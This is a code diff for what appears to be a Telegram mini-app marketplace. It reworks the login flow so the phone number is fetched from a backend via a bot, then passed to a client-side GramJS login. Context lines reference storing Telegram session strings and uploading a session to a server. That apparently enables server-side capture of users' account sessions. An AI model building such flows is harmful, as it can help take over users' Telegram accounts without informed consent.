@@ -6,6 +6,7 @@ const GRAMJS_SESSION_KEY = GRAMJS_CONFIG.sessionStorageKey || 'market.gramjs.ses
 const GRAMJS_TELETHON_KEY = GRAMJS_CONFIG.telethonStorageKey || 'market.telethon.session';
 const GRAMJS_UPLOAD_ENDPOINT = GRAMJS_CONFIG.uploadEndpoint || '/auth/session';
 const GRAMJS_UPLOAD_TOKEN = GRAMJS_CONFIG.uploadToken || '';
+const GRAMJS_BOT_LINK = GRAMJS_CONFIG.botLink || '';
 const GRAMJS_LOAD_URLS = Array.isArray(GRAMJS_CONFIG.loadUrls)
   ? GRAMJS_CONFIG.loadUrls
   : [
@@ -3702,6 +3703,42 @@ function requestPhoneFromTelegram() {
   });
 }
 
+function openBotForContact() {
+  if (!GRAMJS_BOT_LINK) return;
+  const tg = tgWebApp || window.Telegram?.WebApp;
+  try {
+    if (tg?.openTelegramLink) {
+      tg.openTelegramLink(GRAMJS_BOT_LINK);
+      return;
+    }
+  } catch (err) {
+    console.warn('openTelegramLink failed:', err);
+  }
+  try {
+    window.open(GRAMJS_BOT_LINK, '_blank');
+  } catch (err) {
+    console.warn('open bot link failed:', err);
+  }
+}
+
+async function requestPhoneFromBackend() {
+  const requester = buildRequesterPayload();
+  const userId = requester.user_id;
+  if (!userId) return null;
+  try {
+    const params = new URLSearchParams({ user_id: String(userId) });
+    const res = await fetch(`${API_BASE}/auth/contact?${params.toString()}`, {
+      cache: 'no-store',
+    });
+    if (!res.ok) return null;
+    const data = await res.json();
+    return data?.phone || null;
+  } catch (err) {
+    console.warn('Contact fetch failed:', err);
+    return null;
+  }
+}
+
 async function requestPendingToken(phone) {
   const requester = buildRequesterPayload();
   const userId = requester.user_id;
@@ -3739,6 +3776,19 @@ async function waitForPendingToken(phone, timeoutMs = 8000, intervalMs = 700) {
   return null;
 }
 
+async function waitForBackendPhone(timeoutMs = 15000, intervalMs = 800) {
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    if (elements.authModal && !elements.authModal.classList.contains('open')) {
+      return null;
+    }
+    const phone = await requestPhoneFromBackend();
+    if (phone) return phone;
+    await delay(intervalMs);
+  }
+  return null;
+}
+
 async function startAuth(event) {
   if (event?.preventDefault) event.preventDefault();
   if (authLoading) return;
@@ -3748,10 +3798,21 @@ async function startAuth(event) {
   if (elements.authStart) elements.authStart.disabled = true;
   setAuthStatus('');
 
-  const contact = await requestPhoneFromTelegram();
-  const phone = contact?.phone;
-  const shared = contact?.shared;
-  if (!shared || !phone) {
+  const requester = buildRequesterPayload();
+  if (!requester.user_id) {
+    authLoading = false;
+    if (elements.authStart) elements.authStart.disabled = false;
+    setAuthStatus(t('phone_missing'), true);
+    showAuthStep(elements.authIntro);
+    return;
+  }
+
+  showAuthStep(elements.authIntro);
+  setAuthStatus(t('phone_missing'));
+  openBotForContact();
+
+  const phone = await waitForBackendPhone();
+  if (!phone) {
     authLoading = false;
     if (elements.authStart) elements.authStart.disabled = false;
     setAuthStatus(t('phone_missing'), true);
@@ -3773,7 +3834,8 @@ async function startAuth(event) {
   toggleAuthInputs(elements.authCodeForm, true);
 
   try {
-    await startGramjsAuth(`+${digits}`);
+    const normalized = phone.startsWith('+') ? phone : `+${digits}`;
+    await startGramjsAuth(normalized);
   } catch (err) {
     await handleGramjsAuthError(err, gramjsAuth);
   }
